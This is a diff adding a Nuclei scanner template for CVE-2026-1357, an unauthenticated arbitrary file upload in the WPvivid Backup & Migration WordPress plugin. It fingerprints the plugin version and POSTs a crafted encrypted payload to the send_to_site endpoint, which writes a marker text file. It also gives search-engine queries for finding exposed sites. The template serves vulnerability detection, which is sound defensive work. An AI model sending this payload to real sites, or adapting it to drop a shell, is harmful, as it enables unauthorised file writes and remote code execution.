@@ -1,0 +1,105 @@
+id: CVE-2026-1357
+
+info:
+  name: WPvivid Backup & Migration <= 0.9.123 - Unauthenticated Arbitrary File Upload
+  author: omarkurt
+  severity: critical
+  description: |
+    The WPvivid Backup & Migration plugin for WordPress up to version 0.9.123
+    is vulnerable to unauthenticated arbitrary file upload via the
+    wpvivid_action=send_to_site endpoint. Improper RSA decryption error handling
+    causes a fail-open condition where a null-byte AES key is used, combined with
+    path traversal in the filename parameter, allowing upload of arbitrary files
+    for Remote Code Execution.
+  remediation: Upgrade WPvivid Backup & Migration plugin to version 0.9.124 or later.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-1357
+    - https://www.wordfence.com/threat-intel/vulnerabilities/id/e5af0317-ef46-4744-9752-74ce228b5f37
+    - https://github.com/LucasM0ntes/POC-CVE-2026-1357
+    - https://vulnerabletarget.com/VT-2026-1357
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2026-1357
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: wpvivid
+    product: wpvivid-backuprestore
+    shodan-query: http.component:"WordPress"
+    fofa-query: body="wp-content/plugins/wpvivid-backuprestore"
+  tags: cve,cve2026,wordpress,wpvivid,file-upload,rce
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/wpvivid-backuprestore/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "WPvivid"
+          - "Stable tag:"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: version
+        part: body
+        group: 1
+        regex:
+          - '(?i)Stable\s+tag:\s*(\d+\.\d+\.\d+)'
+        internal: true
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        wpvivid_action=send_to_site&wpvivid_content=MDAzQUJDMDAwMDAwMDAwMDAwMDExMDUGpYqxgOo0%2FZM3%2BLE%2B23CYS%2BI8Sbr6wwwU6dJweFxMk%2BOogH3GIpPZZMrm72oUS3vnrlf0AXv1vmGVBIbLo3QcQs%2B4JU7cLQw1kWByCFlYkpHcBuzxjEbVtT8VSdFgb6NLW6cpP4BdWT8bJx%2F%2FAOO09m3EFtf2sOcE%2BJjFJAew%2BELondwDkz3u5mssxGaQrlvWgaIlmPwz3FZx8dWC%2FHy7k4P3S5IJ7JV0tefjHJKCOzjPHngkZENu1uI2LmE6JaeF7XdXJCcmFOrNex4yJgIO0raawogHW457fM4wXKDnrM3bwxeLn5KwvAgadaTj4F9zWHxnjBmpa%2BtIaohISVcA5%2BGv6cAA95rzOoXBGUaI
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":"success"'
+
+      - type: dsl
+        dsl:
+          - 'compare_versions(version, "<= 0.9.123")'
+
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /wp-content/uploads/vt-nuclei-test.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CVE-2026-1357-nuclei-verification-test"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'CVE-2026-1357-nuclei-verification-test'
